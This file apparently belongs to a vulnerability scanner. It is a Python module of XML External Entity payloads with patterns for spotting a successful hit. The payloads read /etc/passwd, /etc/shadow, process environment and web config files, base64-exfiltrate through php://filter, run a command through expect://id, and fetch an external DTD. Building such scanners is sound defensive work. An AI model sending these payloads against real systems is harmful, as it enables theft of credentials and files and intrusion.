"""Payloads para detección de XML External Entity (XXE)."""

QUICK_PAYLOADS = [
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "VULN_XXE_TEST">]><root>&xxe;</root>',
]

FULL_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1:9999/evil.dtd">%xxe;]><root>test</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/issue">]><root>&xxe;</root>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///var/www/html/config.php">]><data>&xxe;</data>',
    '<?xml version="1.0"?><!DOCTYPE replace [<!ENTITY xxe "VULN_XXE_FULL_TEST">]><root>&xxe;</root>',
]

# Patrones que indican XXE exitoso
DETECTION_PATTERNS = [
    "root:",
    "/bin/bash",
    "VULN_XXE_TEST",
    "VULN_XXE_FULL_TEST",
    "localhost",
    "127.0.0.1",
    "<?xml",
    "SYSTEM",
    "password",
    "/etc/passwd",
    "nobody",
    "www-data",
]
